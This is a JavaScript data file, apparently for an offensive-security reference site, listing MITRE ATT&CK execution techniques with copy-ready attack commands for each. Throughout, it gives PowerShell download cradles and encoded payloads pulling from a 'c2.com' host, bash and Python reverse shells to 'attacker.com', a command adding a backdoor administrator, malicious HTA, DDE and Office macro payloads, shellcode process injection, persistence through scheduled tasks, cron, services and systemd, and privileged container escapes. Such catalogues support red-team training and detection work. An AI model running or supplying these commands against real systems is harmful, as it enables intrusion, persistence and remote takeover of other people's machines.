export const executionTechniques = [
  {
    id: "T1059",
    name: "Command and Scripting Interpreter",
    summary: "PowerShell • Bash • cmd.exe • Python • VBA",
    description: "Using command-line interfaces and scripting languages to execute malicious commands and scripts.",
    tags: ["T1059", "PowerShell", "Bash", "Python", "cmd.exe"],
    steps: [
      { type: "comment", content: "# T1059.001 - PowerShell execution bypass and download cradle" },
      { type: "cmd", content: "powershell -ep bypass -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://c2.com/p.ps1')\"" },
      { type: "comment", content: "# T1059.001 - Encoded PowerShell command" },
      { type: "code", content: "# Encode command to bypass basic detection:\n$cmd = 'IEX(IWR http://c2.com/p.ps1 -UseBasicParsing)'\n$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))\nWrite-Host \"powershell -enc $encoded\"" },
      { type: "comment", content: "# T1059.004 - Unix shell one-liner reverse shell" },
      { type: "cmd", content: "bash -i >& /dev/tcp/attacker.com/4444 0>&1" },
      { type: "comment", content: "# T1059.006 - Python reverse shell" },
      { type: "code", content: "python3 -c 'import socket,subprocess,os;\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\ns.connect((\"attacker.com\",4444));\nos.dup2(s.fileno(),0);\nos.dup2(s.fileno(),1);\nos.dup2(s.fileno(),2);\nsubprocess.call([\"/bin/sh\",\"-i\"])'" },
      { type: "comment", content: "# T1059.003 - Windows cmd.exe execution" },
      { type: "cmd", content: "cmd.exe /c \"net user backdoor P@ssw0rd! /add && net localgroup administrators backdoor /add\"" },
    ]
  },
  {
    id: "T1059.007",
    name: "JavaScript / JScript",
    summary: "WScript • CScript • Node.js • HTA",
    description: "Using JavaScript or JScript via WScript.exe, CScript.exe, HTA files, or Node.js to execute malicious code.",
    tags: ["T1059.007", "JavaScript", "JScript", "WScript", "HTA"],
    steps: [
      { type: "comment", content: "# Execute JScript via CScript" },
      { type: "cmd", content: "cscript //nologo payload.js" },
      { type: "comment", content: "# Malicious HTA file for execution" },
      { type: "code", content: "<html><head>\n<script language=\"VBScript\">\nSet wsh = CreateObject(\"WScript.Shell\")\nwsh.Run \"powershell -nop IEX(IWR http://c2.com/p.ps1)\"\n</script>\n</head></html>" },
      { type: "comment", content: "# Launch HTA from cmd or URL" },
      { type: "cmd", content: "mshta.exe http://c2.com/payload.hta\nmshta.exe vbscript:Execute(\"CreateObject(\"\"WScript.Shell\"\").Run \"\"powershell ...\"\"\")" },
    ]
  },
  {
    id: "T1203",
    name: "Exploitation for Client Execution",
    summary: "CVE exploits • Office • browser • PDF",
    description: "Exploiting vulnerabilities in client-side software such as web browsers, Office applications, or PDF readers to achieve code execution.",
    tags: ["T1203", "client exploit", "Office exploit", "browser exploit"],
    steps: [
      { type: "comment", content: "# Generate malicious Office document with Metasploit" },
      { type: "cmd", content: "msfconsole -q -x 'use exploit/multi/fileformat/office_word_macro; set payload windows/x64/meterpreter/reverse_https; set LHOST c2.com; set LPORT 443; run'" },
      { type: "comment", content: "# Use macro_pack to embed macro in document" },
      { type: "cmd", content: "echo 'IEX(New-Object Net.WebClient).DownloadString(\"http://c2.com/p.ps1\")' | macro_pack.exe -t PS -G payload.docm" },
      { type: "comment", content: "# Phishing doc with CVE-2021-40444 (MSHTML) exploit" },
      { type: "cmd", content: "# CVE-2021-40444 PoC: https://github.com/klezVirus/CVE-2021-40444\n# Craft malicious .docx with external OLE object referencing attacker-hosted .cab\npython3 CVE-2021-40444.py generate -p 'cmd.exe /c calc.exe' -o payload.docx" },
    ]
  },
  {
    id: "T1559",
    name: "Inter-Process Communication",
    summary: "COM • DDE • named pipes",
    description: "Abusing inter-process communication mechanisms such as COM objects, DDE, or named pipes to execute code.",
    tags: ["T1559", "COM", "DDE", "named pipes"],
    steps: [
      { type: "comment", content: "# T1559.001 - Execute via COM object" },
      { type: "code", content: "// VBScript COM execution\nSet wsh = CreateObject(\"WScript.Shell\")\nwsh.Run \"cmd /c calc.exe\", 0, False" },
      { type: "comment", content: "# T1559.002 - DDE (Dynamic Data Exchange) in Excel" },
      { type: "text", content: "Insert DDE field in Excel cell: =cmd|'/c powershell -nop IEX(IWR http://c2.com/p.ps1)'!'A1'" },
      { type: "comment", content: "# T1559 - Named pipe for inter-process execution" },
      { type: "code", content: "// Create named pipe server in PowerShell\n$pipe = New-Object System.IO.Pipes.NamedPipeServerStream('mypipe')\n$pipe.WaitForConnection()\n# Execute code received over pipe" },
    ]
  },
  {
    id: "T1106",
    name: "Native API",
    summary: "WinAPI • NtCreateProcess • syscalls",
    description: "Using Windows or OS native API calls directly to execute code, bypassing higher-level security controls.",
    tags: ["T1106", "WinAPI", "syscalls", "native API"],
    steps: [
      { type: "comment", content: "# Use Windows API for process injection via shellcode" },
      { type: "code", content: "// C - Native API shellcode execution\nHANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);\nLPVOID mem = VirtualAllocEx(hProc, NULL, shellcode_len,\n    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\nWriteProcessMemory(hProc, mem, shellcode, shellcode_len, NULL);\nCreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);" },
      { type: "comment", content: "# Use direct syscalls to bypass EDR hooks" },
      { type: "code", content: "// Direct syscall via SysWhispers3\nNtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL,\n    hProcess, (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, FALSE, 0, 0, 0, NULL);" },
    ]
  },
  {
    id: "T1053",
    name: "Scheduled Task / Job",
    summary: "schtasks • cron • at • systemd timers",
    description: "Abusing task scheduling facilities to execute malicious code at specified times or intervals.",
    tags: ["T1053", "schtasks", "cron", "at", "systemd"],
    steps: [
      { type: "comment", content: "# T1053.005 - Create scheduled task on Windows" },
      { type: "cmd", content: "schtasks /create /tn \"Windows Update\" /tr \"powershell -nop -w hidden -c IEX(IWR http://c2.com/p.ps1)\" /sc onlogon /ru SYSTEM" },
      { type: "comment", content: "# Create task via PowerShell" },
      { type: "code", content: "$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-nop -w hidden -c IEX(IWR http://c2.com/p.ps1)'\n$trigger = New-ScheduledTaskTrigger -AtStartup\nRegister-ScheduledTask -Action $action -Trigger $trigger -TaskName 'WinDefUpdate' -RunLevel Highest" },
      { type: "comment", content: "# T1053.003 - Cron job on Linux" },
      { type: "cmd", content: "echo '*/5 * * * * root curl http://c2.com/cron.sh | bash' >> /etc/crontab" },
      { type: "comment", content: "# T1053.006 - Systemd timer for persistence" },
      { type: "cmd", content: "# Create /etc/systemd/system/update.timer and update.service\nsystemctl enable update.timer && systemctl start update.timer" },
    ]
  },
  {
    id: "T1072",
    name: "Software Deployment Tools",
    summary: "SCCM • Ansible • Puppet • PDQ Deploy",
    description: "Using legitimate software deployment and management tools to execute malicious code across multiple systems.",
    tags: ["T1072", "SCCM", "Ansible", "Puppet", "deployment"],
    steps: [
      { type: "comment", content: "# Deploy malicious payload via SCCM application deployment" },
      { type: "text", content: "Use compromised SCCM admin credentials to create a new application deployment targeting all managed devices." },
      { type: "comment", content: "# Ansible playbook execution for lateral movement" },
      { type: "code", content: "# malicious_playbook.yml\n- hosts: all\n  tasks:\n    - name: Execute payload\n      shell: curl http://c2.com/payload.sh | bash\n      become: yes" },
      { type: "cmd", content: "ansible-playbook -i inventory.txt malicious_playbook.yml" },
    ]
  },
  {
    id: "T1569",
    name: "System Services",
    summary: "sc.exe • launchctl • service creation",
    description: "Creating or modifying system services to execute malicious code, often with SYSTEM-level privileges.",
    tags: ["T1569", "sc.exe", "Windows service", "launchctl"],
    steps: [
      { type: "comment", content: "# T1569.002 - Create malicious Windows service" },
      { type: "cmd", content: "sc create \"Windows Update\" binPath= \"cmd.exe /c powershell -nop -w hidden -c IEX(IWR http://c2.com/p.ps1)\" start= auto" },
      { type: "cmd", content: "sc start \"Windows Update\"" },
      { type: "comment", content: "# Impacket svcexec for remote service execution" },
      { type: "cmd", content: "smbexec.py domain/user:pass@target  # Uses temporary service creation" },
      { type: "comment", content: "# T1569.001 - macOS launchctl" },
      { type: "cmd", content: "launchctl submit -l com.apple.update -p /usr/bin/curl -- http://c2.com/mac.sh | bash" },
    ]
  },
  {
    id: "T1204",
    name: "User Execution",
    summary: "malicious files • links • social engineering",
    description: "Relying on user action to execute malicious code, such as clicking links, opening attachments, or running fake installers.",
    tags: ["T1204", "social engineering", "malicious attachment", "user click"],
    steps: [
      { type: "comment", content: "# T1204.002 - Disguise payload as legitimate installer" },
      { type: "cmd", content: "# Wrap payload with legitimate installer using Inno Setup\n# Create installer that drops and executes malware alongside real app" },
      { type: "comment", content: "# T1204.001 - Malicious link in email or Teams" },
      { type: "text", content: "Craft phishing email with fake OneDrive link that downloads a malicious file when clicked." },
      { type: "comment", content: "# T1204.003 - Malicious Docker image" },
      { type: "cmd", content: "docker pull attacker/legitimate-looking-tool:latest\n# Image contains malicious layers that execute on container start" },
    ]
  },
  {
    id: "T1047",
    name: "Windows Management Instrumentation",
    summary: "wmic • WMI • PowerShell CIM",
    description: "Using Windows Management Instrumentation (WMI) to execute commands locally or remotely, often to evade detection.",
    tags: ["T1047", "WMI", "wmic", "PowerShell CIM"],
    steps: [
      { type: "comment", content: "# Execute remote command via WMI" },
      { type: "cmd", content: "wmic /node:TARGET /user:DOMAIN\\user /password:pass process call create \"powershell -nop -w hidden IEX(IWR http://c2.com/p.ps1)\"" },
      { type: "comment", content: "# WMI execution via PowerShell CIM" },
      { type: "code", content: "$options = New-CimSessionOption -Protocol DCOM\n$session = New-CimSession -ComputerName TARGET -Credential $cred -SessionOption $options\nInvoke-CimMethod -ClassName Win32_Process -MethodName Create -CimSession $session -Arguments @{CommandLine='calc.exe'}" },
      { type: "comment", content: "# Impacket wmiexec for fileless execution" },
      { type: "cmd", content: "wmiexec.py domain/user:pass@target.com 'whoami'" },
    ]
  },
  {
    id: "T1609",
    name: "Container Administration Command",
    summary: "docker exec • kubectl exec • container breakout",
    description: "Abusing container administration interfaces to execute commands within containers or escape to the host.",
    tags: ["T1609", "docker exec", "kubectl exec", "container"],
    steps: [
      { type: "comment", content: "# Execute commands inside running container" },
      { type: "cmd", content: "docker exec -it container_id /bin/bash\nkubectl exec -it pod-name -- /bin/sh" },
      { type: "comment", content: "# Deploy malicious container via misconfigured Docker API" },
      { type: "cmd", content: "curl http://docker-host:2375/containers/create -X POST -H 'Content-Type: application/json' \\\n  -d '{\"Image\":\"alpine\",\"HostConfig\":{\"Binds\":[\"/:/mnt\"],\"Privileged\":true}}'" },
    ]
  },
  {
    id: "T1610",
    name: "Deploy Container",
    summary: "docker run • kubectl apply • malicious image",
    description: "Deploying new containers with malicious images or configurations to achieve execution or persistence.",
    tags: ["T1610", "docker run", "kubectl", "malicious container"],
    steps: [
      { type: "comment", content: "# Deploy privileged container for host escape" },
      { type: "cmd", content: "docker run --rm -it --privileged --pid=host alpine nsenter -t 1 -m -u -n -i sh" },
      { type: "comment", content: "# Deploy malicious pod via kubectl" },
      { type: "code", content: "# malicious-pod.yaml\napiVersion: v1\nkind: Pod\nmetadata:\n  name: privileged-pod\nspec:\n  containers:\n  - name: attacker\n    image: attacker/c2-image:latest\n    securityContext:\n      privileged: true\n    volumeMounts:\n    - mountPath: /host\n      name: host-root\n  volumes:\n  - name: host-root\n    hostPath:\n      path: /" },
      { type: "cmd", content: "kubectl apply -f malicious-pod.yaml" },
    ]
  },
];